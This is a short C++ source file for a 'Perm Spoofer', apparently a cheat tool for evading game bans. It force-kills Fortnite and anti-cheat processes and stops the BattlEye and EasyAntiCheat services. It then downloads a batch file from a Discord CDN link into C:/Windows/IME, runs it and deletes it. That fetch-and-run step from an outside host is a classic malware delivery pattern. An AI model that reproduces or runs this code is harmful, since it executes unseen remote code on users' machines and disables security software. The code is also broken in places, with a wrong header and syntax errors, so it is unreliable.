#include <instream>
#include <Windows.h>

// MB if this is sloppy, i made it in github.

void PermBAT() // <- URLToDownload, Found in bad P2C's and Pastes 
{
  	HRESULT z = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/Example.bat"), _T("C:/Windows/IME/Perm.bat"), 0, NULL);
}

int main()
{
  SetConsoleTitleA("Perm Spoofer / Brand Name");
  printf("Loading PERM Spoofer");
  Sleep(2000);
  
  system("taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1");
	system("taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1");
	system("taskkill /F /IM BEService.exe >nul 2>&1");
	system("taskkill /F /IM Fortnite.exe >nul 2>&1");
	system("taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1");
	system("taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1");
	system("sc stop BEService >nul 2>&1");
	system("sc stop BEDaisy >nul 2>&1");
	system("sc stop EasyAntiCheat >nul 2>&1");
	system("sc stop EasyAntiCheatSys >nul 2>&1");
  
  system("cls");
  
  printf("Starting");
  PermBAT();
  system("start C:/Windows/IME/Perm.bat");
  std::remove("C:/Windows/IME/Perm.bat");
  
  system("cls");
  printf("Successfully Spoofed\n"):
  printf("Pause);
  return 1;
}
